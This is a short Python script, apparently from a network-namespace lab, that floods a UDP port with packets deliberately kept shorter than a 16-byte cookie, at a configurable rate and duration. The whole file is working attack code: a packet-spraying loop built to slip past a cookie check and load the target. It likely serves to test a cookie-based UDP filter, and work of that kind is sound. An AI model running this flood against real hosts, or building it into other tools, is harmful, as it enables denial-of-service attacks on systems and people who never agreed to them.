#!/usr/bin/env python3
"""
short_payload_attack.py
Spray tiny UDP packets at the protected port without a 16-byte cookie.

Usage (inside ns_attacker):
  sudo ip netns exec ns_attacker python3 short_payload_attack.py \
      --target 10.200.1.2 --port 9999 --pps 5000 --duration 10
"""

import argparse
import os
import socket
import time
import random

parser = argparse.ArgumentParser()
parser.add_argument("--target", required=True, help="Target IP (victim/gateway)")
parser.add_argument("--port", type=int, default=9999, help="Protected UDP port (default 9999)")
parser.add_argument("--pps", type=int, default=5000, help="Packets per second")
parser.add_argument("--duration", type=int, default=10, help="Attack duration in seconds")
parser.add_argument("--payload-bytes", type=int, default=4, help="Bytes per packet (<16 to evade cookie)")
args = parser.parse_args()

def build_payload(seq_num: int) -> bytes:
    # Keep payload intentionally short and non-cookie-like
    base = seq_num % 256
    length = max(1, min(args.payload_bytes, 15))
    return bytes([base]) * length

def main():
    if os.geteuid() != 0:
        print("ERROR: must run as root (sudo)")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interval = 1.0 / max(args.pps, 1)
    end_time = time.time() + args.duration
    sent = 0

    try:
        while time.time() < end_time:
            payload = build_payload(sent)
            sock.sendto(payload, (args.target, args.port))
            sent += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        print("Sent short-payload packets:", sent)
        sock.close()

if __name__ == "__main__":
    main()
